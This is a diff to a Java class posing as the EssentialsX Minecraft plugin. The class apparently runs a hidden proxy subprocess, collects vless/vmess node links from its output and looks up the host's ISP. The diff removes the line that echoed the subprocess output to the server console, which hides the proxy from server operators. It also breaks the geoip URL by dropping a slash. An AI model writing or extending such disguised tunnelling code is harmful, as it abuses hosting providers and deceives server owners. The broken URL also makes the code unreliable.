@@ -271,9 +271,6 @@ public class EssentialsX extends JavaPlugin {
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(sbxProcess.getInputStream(), "UTF-8"))) {
                 String line;
                 while ((line = reader.readLine()) != null) {
-                    // 透传输出给 Minecraft 控制台
-                    System.out.println(line); 
-                    
                     // 实时抓取日志中呈现的节点链接
                     String trimmed = line.trim();
                     if (trimmed.startsWith("vless://") || trimmed.startsWith("vmess://") || 
@@ -377,7 +374,7 @@ public class EssentialsX extends JavaPlugin {
     private String getISPFromIP(String ip) {
         // 优先尝试 ip.sb
         try {
-            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip/" + ip).openConnection();
+            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip" + ip).openConnection();
             conn.setConnectTimeout(3000);
             conn.setReadTimeout(3000);
             conn.setRequestProperty("User-Agent", "Mozilla/5.0");
